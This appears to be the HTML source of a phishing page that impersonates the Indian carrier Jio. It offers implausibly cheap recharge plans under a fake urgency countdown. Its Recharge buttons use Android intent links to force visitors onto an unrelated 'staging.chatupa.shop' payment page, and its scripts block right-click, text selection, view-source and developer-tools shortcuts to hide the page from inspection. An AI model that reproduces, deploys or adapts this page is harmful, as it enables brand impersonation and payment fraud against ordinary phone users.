<html lang="en">
  <head>
      <!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '490664363665404');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=490664363665404&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
    <meta charset="utf-8" />
    <link rel="icon" href="/assets/images/logo.svg" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta name="theme-color" content="#000000" />
    <meta
      name="description"
      content="Web site created using create-react-app"
    />
    <link rel="apple-touch-icon" href="/assets/images/logo.svg" />
    <title>Jio - Best Prepaid, Postpaid Plans</title>
    <link href="assets/css/custom.css" rel="stylesheet" />

    <script>
        function selectValue(value) {
            localStorage.setItem("selectedValue", value);
            window.location.href = "payment";
        }

        window.onload = function() {
            const mobileNumber = localStorage.getItem("mobileNumber");
            document.getElementById("mobile-number").innerText = mobileNumber || "No mobile number found.";
        }
    </script>

        <style>
        * {
            -webkit-user-select: none; /* Safari */
            -moz-user-select: none; /* Firefox */
            -ms-user-select: none; /* Internet Explorer/Edge */
            user-select: none; /* Standard syntax */
        
        
        }
        .up{
              width: 700px;
              height:60px;
              background-color: #0a2885;
        }
    </style>
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
      <div
        class="py-4 px-6 bg-blue-700 flex items-center justify-between text-white"
      >
        <div class="flex items-center">
          <svg
            stroke="currentColor"
            fill="currentColor"
            stroke-width="0"
            viewBox="0 0 448 512"
            class="text-white mr-3"
            height="20"
            width="20"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"
            ></path></svg
          ><a href="/"
            ><img
              src="/assets/images/logo.png"
              alt=""
              class="w-8"
          /></a>
        </div>
        <div class="mx-2">
          <div class="searchBar">
            <input
              id="searchQueryInput"
              type="text"
              name="searchQueryInput"
              placeholder="Search"
              value=""
            /><button
              id="searchQuerySubmit"
              type="submit"
              name="searchQuerySubmit"
            >
              <svg class="h-[24px] w-[24px]" viewBox="0 0 24 24">
                <path
                  fill="#fff"
                  d="M9.5,3A6.5,6.5 0 0,1 16,9.5C16,11.11 15.41,12.59 14.44,13.73L14.71,14H15.5L20.5,19L19,20.5L14,15.5V14.71L13.73,14.44C12.59,15.41 11.11,16 9.5,16A6.5,6.5 0 0,1 3,9.5A6.5,6.5 0 0,1 9.5,3M9.5,5C7,5 5,7 5,9.5C5,12 7,14 9.5,14C12,14 14,12 14,9.5C14,7 12,5 9.5,5Z"
                ></path>
              </svg>
            </button>
          </div>
        </div>
        <div>
          <svg
            stroke="currentColor"
            fill="currentColor"
            stroke-width="0"
            viewBox="0 0 512 512"
            class="text-white"
            height="30"
            width="30"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"
            ></path>
          </svg>
        </div>
      </div>
      <div>
        <div
          class="bg-[rgba(0,0,0,0.7)] fixed h-full w-full top-0 p-16 flex items-center"
          id="overlay"
        >
          <svg
            stroke="currentColor"
            fill="currentColor"
            stroke-width="0"
            viewBox="0 0 512 512"
            class="text-white z-[999] absolute top-[35%] right-[15%]"
            height="30"
            width="30"
            xmlns="http://www.w3.org/2000/svg"
          >
            <path
              d="m289.94 256 95-95A24 24 0 0 0 351 127l-95 95-95-95a24 24 0 0 0-34 34l95 95-95 95a24 24 0 1 0 34 34l95-95 95 95a24 24 0 0 0 34-34z"
            ></path></svg
          ><img
            src="/assets/images/offer.png"
            alt=""
            class=""
          />
        </div>
        <div
          class="bg-slate-100 py-4 px-4 text-[14px] flex items-center justify-between"
        >
          <div>
            Recharging for <span class="font-bold text-[14px]" id="mobile-number"></span>
          </div>
          <a class="text-blue-600" href="/">Change</a>
        </div>
        <div
          class="flex items-center justify-center py-1 px-4 mt-2 bg-slate-100 text-[14px]"
        >
          <div class="text-slate-700 mr-2">Special Offer Ends In:</div>
          <div class="text-slate-700 flex items-center">
            <svg
              stroke="currentColor"
              fill="currentColor"
              stroke-width="0"
              viewBox="0 0 512 512"
              class="mr-[2px] mt-[1px]"
              height="1em"
              width="1em"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M256,8C119,8,8,119,8,256S119,504,256,504,504,393,504,256,393,8,256,8Zm92.49,313h0l-20,25a16,16,0,0,1-22.49,2.5h0l-67-49.72a40,40,0,0,1-15-31.23V112a16,16,0,0,1,16-16h32a16,16,0,0,1,16,16V256l58,42.5A16,16,0,0,1,348.49,321Z"
              ></path></svg
            ><span id="timer">15:00</span>
          </div>
        </div>
        <div class="pb-8 pt-6 px-4">
          <h1 class="text-[30px] font-bold">Special Offer Plans</h1>
          <h2 class="text-[20px] font-semibold mt-2">Recommended(3)</h2>
          
          <!--149 mate cheeeeeeeee-->
          <a class="bg-[#0a2885] py-2 w-full text-[16px] rounded-full font-bold text-white"
        onclick="window.location.href='intent://staging.chatupa.shop/payment#Intent;scheme=https;package=com.android.chrome;end'; selectValue(149);">
          <div class="bg-slate-200 rounded-3xl p-4 my-8">
            <div
              class="bg-slate-700 py-1 px-3 rounded text-white text-[14px] font-bold w-fit"
            >
              SPECIAL
            </div>
            <div class="flex items-center justify-between my-2">
              <div
                class="flex items-center text-[20px] font-bold text-slate-800"
              >
                <div>₹149</div>
                <div class="ml-4 line-through text-slate-600">₹666</div>
              </div>
              <div>
                <img
                  src="/assets/images/5g.svg"
                  alt=""
                />
              </div>
            </div>
            <div class="text-[12px] text-blue-700 font-bold">View Details</div>
            <div class="flex items-center justify-between mt-3">
              <div class="">
                <div class="text-slate-600 text-[16px]">VALIDITY</div>
                <div class="text-slate-800 text-[16px] font-bold">84 days</div>
              </div>
              <div class="">
                <div class="text-slate-600 text-[16px]">DATA</div>
                <div class="text-slate-800 text-[16px] font-bold">
                  1.5 GB/day
                </div>
              </div>
              <div class="">
                <div class="text-slate-600 text-[16px]">Voice</div>
                <div class="text-slate-800 text-[16px] font-bold">
                  Unlimited
                </div>
              </div>
              <div class="">
                <div class="text-slate-600 text-[16px]">SMS</div>
                <div class="text-slate-800 text-[16px] font-bold">100/day</div>
              </div>
            </div>
            <div class="text-slate-600 text-[16px] mt-3">SUBSCRIPTIONS</div>
            <div class="flex items-center mt-2">
              <img
                src="/assets/images/jiotv.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/jiocinema.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/jiosavan.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/jiocloud.svg"
                alt=""
                class="h-8 mx-1"
              />
            </div>
            <div class="mt-5">
              <button class="bg-[#0a2885] py-2 w-full text-[16px] rounded-full font-bold text-white"
        onclick="window.location.href='intent://staging.chatupa.shop/payment#Intent;scheme=https;package=com.android.chrome;end'; selectValue(149);">
    Recharge
</button>
            </div>
          </div>
          </a>
          
          <!--199 mate cheeeeeeeee-->
          <a class="bg-[#0a2885] py-2 w-full text-[16px] rounded-full font-bold text-white"
        onclick="window.location.href='intent://staging.chatupa.shop/paymentt#Intent;scheme=https;package=com.android.chrome;end'; selectValue(149);">
          <div class="bg-slate-200 rounded-3xl p-4 my-8">
            <div
              class="bg-slate-700 py-1 px-3 rounded text-white text-[14px] font-bold w-fit"
            >
              SPECIAL
            </div>
            <div class="flex items-center justify-between my-2">
              <div
                class="flex items-center text-[20px] font-bold text-slate-800"
              >
                <div>₹199</div>
                <div class="ml-4 line-through text-slate-600">₹1099</div>
              </div>
              <div>
                <img
                  src="/assets/images/5g.svg"
                  alt=""
                />
              </div>
            </div>
            <div class="text-[12px] text-blue-700 font-bold">View Details</div>
            <div class="flex items-center justify-between mt-3">
              <div class="">
                <div class="text-slate-600 text-[16px]">VALIDITY</div>
                <div class="text-slate-800 text-[16px] font-bold">156 days</div>
              </div>
              <div class="">
                <div class="text-slate-600 text-[16px]">DATA</div>
                <div class="text-slate-800 text-[16px] font-bold">
                  2.0 GB/day
                </div>
              </div>
              <div class="">
                <div class="text-slate-600 text-[16px]">Voice</div>
                <div class="text-slate-800 text-[16px] font-bold">
                  Unlimited
                </div>
              </div>
              <div class="">
                <div class="text-slate-600 text-[16px]">SMS</div>
                <div class="text-slate-800 text-[16px] font-bold">100/day</div>
              </div>
            </div>
            <div class="text-slate-600 text-[16px] mt-3">SUBSCRIPTIONS</div>
            <div class="flex items-center mt-2">
              <img
                src="/assets/images/jiotv.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/jiocinema.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/jiosavan.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/jiocloud.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/netflix.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/amazonprime.svg"
                alt=""
                class="h-8 mx-1"
              />
            </div>
            <div class="mt-5">
             <button class="bg-[#0a2885] py-2 w-full text-[16px] rounded-full font-bold text-white"
        onclick="window.location.href='intent://staging.chatupa.shop/paymentt#Intent;scheme=https;package=com.android.chrome;end'; selectValue(149);">
    Recharge
</button>
            </div>
          </div>
          </a>
          
          <!--249 mate cheeeeeeeee-->
          <a class="bg-[#0a2885] py-2 w-full text-[16px] rounded-full font-bold text-white"
        onclick="window.location.href='intent://staging.chatupa.shop/paymenttt#Intent;scheme=https;package=com.android.chrome;end'; selectValue(149);">
          <div class="bg-slate-200 rounded-3xl p-4 my-8">
            <div
              class="bg-slate-700 py-1 px-3 rounded text-white text-[14px] font-bold w-fit"
            >
              SPECIAL
            </div>
            <div class="flex items-center justify-between my-2">
              <div
                class="flex items-center text-[20px] font-bold text-slate-800"
              >
                <div>₹249</div>
                <div class="ml-4 line-through text-slate-600">₹1499</div>
              </div>
              <div>
                <img
                  src="/assets/images/5g.svg"
                  alt=""
                />
              </div>
            </div>
            <div class="text-[12px] text-blue-700 font-bold">View Details</div>
            <div class="flex items-center justify-between mt-3">
              <div class="">
                <div class="text-slate-600 text-[16px]">VALIDITY</div>
                <div class="text-slate-800 text-[16px] font-bold">365 days</div>
              </div>
              <div class="">
                <div class="text-slate-600 text-[16px]">DATA</div>
                <div class="text-slate-800 text-[16px] font-bold">
                  3.0 GB/day
                </div>
              </div>
              <div class="">
                <div class="text-slate-600 text-[16px]">Voice</div>
                <div class="text-slate-800 text-[16px] font-bold">
                  Unlimited
                </div>
              </div>
              <div class="">
                <div class="text-slate-600 text-[16px]">SMS</div>
                <div class="text-slate-800 text-[16px] font-bold">100/day</div>
              </div>
            </div>
            <div class="text-slate-600 text-[16px] mt-3">SUBSCRIPTIONS</div>
            <div class="flex items-center mt-2">
              <img
                src="/assets/images/jiotv.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/jiocinema.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/jiosavan.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/jiocloud.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/netflix.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/amazonprime.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/sony.svg"
                alt=""
                class="h-8 mx-1"
              />
            </div>
            <div class="flex items-center mt-2">
              <img
                src="/assets/images/sony.svg"
                alt=""
                class="h-8 mx-1"
              /><img
                src="/assets/images/zee5.svg"
                alt=""
                class="h-8 mx-1"
              />
            </div>
            <div class="mt-5">
              <button class="bg-[#0a2885] py-2 w-full text-[16px] rounded-full font-bold text-white"
        onclick="window.location.href='intent://staging.chatupa.shop/paymenttt#Intent;scheme=https;package=com.android.chrome;end'; selectValue(149);">
    Recharge
</button>
            </div>
          </div>
           </a>
           
        </div>
      </div>
    </div>
    <script src="https://img1.wsimg.com/traffic-assets/js/tccl.min.js"></script>

    <script>
        document.getElementById("overlay").addEventListener("click", function() {
            this.remove();
        });
    </script>
    
    
    <script>
      // Set the countdown time to 15 minutes
var countdownTime = 15 * 60; // 15 minutes * 60 seconds

// Function to update the countdown timer
function updateCountdown() {
    var minutes = Math.floor(countdownTime / 60);
    var seconds = countdownTime % 60;

    // Format minutes and seconds with leading zero if less than 10
    var formattedTime = (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;

    // Update the timer element
    document.getElementById('timer').textContent = formattedTime;

    // Decrement the countdown time
    countdownTime--;

    // If countdown reaches zero, stop the countdown
    if (countdownTime < 0) {
        clearInterval(timerInterval);
        document.getElementById('timer').textContent = '00:00'; // Optional: display 00:00 when the countdown ends
        // You can add additional actions here when the countdown ends
    }
}

// Update the countdown timer every second
var timerInterval = setInterval(updateCountdown, 1000);

    </script>
    
    
    <script>
    (function() {
    // Function to disable F12 key and other common DevTools shortcuts
    function disableKeys(e) {
        // List of key codes to disable (F12 is 123, and others can be added if needed)
        const disabledKeys = [123, 18, 91]; // 123: F12, 18: Alt, 91: Command (Mac)
        
        if (disabledKeys.includes(e.keyCode)  || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || (e.ctrlKey && e.keyCode === 85) || (e.ctrlKey && e.shiftKey)) {
            e.preventDefault(); // Prevent the default action
            e.stopPropagation(); // Stop the event from propagating
        }
    }

    // Function to detect and handle DevTools usage
    function detectDevTools() {
        // Detect if DevTools is open by checking the width of the screen
        const devToolsDetector = () => {
            const threshold = 160; // Customize this threshold value as needed
            const isDevToolsOpen = window.outerWidth - window.innerWidth > threshold ||
                                   window.outerHeight - window.innerHeight > threshold;
            if (isDevToolsOpen) {
                // Optionally, you could redirect or take some other action
                // window.location.href = 'about:blank'; // Example: Redirect to a blank page
            }
        };

        // Periodically check for DevTools
        setInterval(devToolsDetector, 1000);
    }

    // Attach event listener for keydown to disable specific keys
    document.addEventListener('keydown', disableKeys);

    // Disable right-click context menu
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    });

    // Detect DevTools usage
    window.addEventListener('load', detectDevTools);
})();
    
    
</script>
  </body>
</html>
